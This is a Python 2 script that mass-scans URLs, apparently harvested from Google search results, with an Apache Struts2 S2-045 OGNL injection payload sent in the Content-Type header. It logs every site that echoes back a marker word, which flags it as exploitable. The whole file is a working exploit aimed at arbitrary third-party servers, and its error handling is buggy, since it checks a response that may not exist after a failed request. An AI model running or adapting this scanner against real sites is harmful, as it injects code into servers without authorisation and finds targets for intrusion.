# -*- coding: utf-8 -*-
 
import urllib2
 
S2_045 = {"poc": "%{(#nikenb='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println('fuck')).(#o.close())}", "key": "fuck"}
 
 
def poccheck(timeout):
    urls = open('../GoogleSearch/urlresult', 'r')
    detectresults = open('./detectresult', 'w')
    for url in urls.readlines():
        url = url.strip('\n')
        url = url.split('%3F', 1)[0]
        request = urllib2.Request(url)
        request.add_header("Content-Type", S2_045["poc"])
        request.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0")
        try:
            res_html = urllib2.urlopen(request, timeout=timeout).read(204800)
        except Exception,e:
            print 'exception:'+url
        if S2_045['key'] in res_html:
            print S2_045['key']+':'+url
            detectresults.write(url+'\n')
    urls.close()
    detectresults.close()
 
if __name__ == "__main__":
    print poccheck(10)